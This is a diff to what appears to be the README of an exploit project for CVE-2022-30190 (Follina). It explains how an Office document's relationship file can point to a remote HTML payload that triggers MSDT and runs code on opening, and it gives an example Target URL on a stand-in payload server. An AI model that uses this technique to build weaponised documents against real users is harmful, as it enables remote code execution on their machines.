@@ -2,7 +2,7 @@
 
 OK, as you know, or don't know, CVE-2022-30190 vulnerability can be described as like an attacker makes some MS Office, puts inside it's structure some link ( html ), and with the help of that, he manage run a malicious code. OLE object (word/_rels/document.xml.rels)
 <br>
-Data phat puts inside, may describe link in the tags with attributes "TYPE=" and "Target=". Link at the target attribute takes to the HTML, which in our case is our PAYLOAD, so that triggers the MSDT protocol. For example -- > "Target="http://Server-Host-Payload/Payload.html".
+Data phat puts inside, may describe link in the tags with attributes "TYPE=" and "Target=". Link at the target attribute takes to the HTML, which in our case is our PAYLOAD, so that triggers the MSDT protocol. For example -- > "Target="http://Server-Host-Payload:Port/Payload.html".
 
 Now, when opened, the attacker document start to run, and trigger the MSDT.
 The document can run even in ProtectedMode, and more - You dont even need macros enabled.
